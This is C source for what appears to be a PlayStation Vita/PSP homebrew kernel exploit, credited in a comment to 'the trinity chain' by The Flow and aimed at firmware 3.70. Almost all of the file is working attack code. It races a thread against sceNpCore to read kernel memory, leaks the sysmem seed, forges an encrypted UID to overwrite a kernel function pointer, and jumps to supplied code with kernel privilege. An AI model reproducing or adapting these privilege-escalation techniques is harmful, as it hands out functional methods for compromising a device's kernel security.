#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
Kernel exploit from the trinity chain exploit by The Flow. Works on Vita 3.70
*/

#define LIBC_CLOCK_OFFSET  0x88014d00
#define SYSMEM_SEED_OFFSET 0x88014e38
#define FAKE_UID_OFFSET    0x8814cfa8

int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);

void repairInstruction(void) {
  SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
  _sw(mod->text_addr + 0x3904, LIBC_CLOCK_OFFSET);
  k_tbl->KernelIcacheInvalidateAll();
  k_tbl->KernelDcacheWritebackInvalidateAll(); 
}

static volatile int running;
static volatile int idx;
static int input[3];

static int racer(SceSize args, void *argp) {
  running = 1;

  while (running) {
    input[1] = 0;
    g_tbl->KernelDelayThread(10);
    input[1] = idx;
    g_tbl->KernelDelayThread(10);
  }

  return g_tbl->KernelExitDeleteThread(0);
}

static u32 read_kernel_word(u32 addr) {
  SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
  if (thid < 0)
    return 0;

  g_tbl->KernelStartThread(thid, 0, NULL);

  char string[8];
  int round = 0;

  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))

  int i;
  for (i = 0; i < 100000; i++) {
    u32 res = _sceNpCore_8AFAB4A0(input, string, sizeof(string));
    if (res != 5 && res != 0x80550203) {
      switch (round) {
        case 0:
          round = 1;
          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
          break;
        case 1:
          running = 0;
          return res;
      }
    }
  }

  running = 0;
  return 0;
}

int stubScanner(FunctionTable* tbl){
    _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
    return (_sceNpCore_8AFAB4A0 == NULL);
}

int doExploit(void) {
    return 0;
}

void executeKernel(u32 kernelContentFunction){
  int res;

  g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);

  u32 seed = read_kernel_word(SYSMEM_SEED_OFFSET);
  if (!seed)
    return;

  g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);

  g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
  g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);

  SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
  SceUID encrypted_uid = uid ^ seed;

  // Allocate dummy block to improve reliability
  char dummy[32];
  memset(dummy, 'a', sizeof(dummy));
  SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);

  // Plant UID data structure into kernel as string
  u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
  SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);

  g_tbl->KernelDcacheWritebackAll();

  // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
  res = g_tbl->KernelFreePartitionMemory(uid);

  g_tbl->KernelFreePartitionMemory(plantid);
  g_tbl->KernelFreePartitionMemory(dummyid);

  g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
  g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);

  if (res < 0)
    return;

  // Make a jump to kernel function
  _sw(JUMP(kernelContentFunction), 0x08888888);
  _sw(NOP, 0x08888888+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
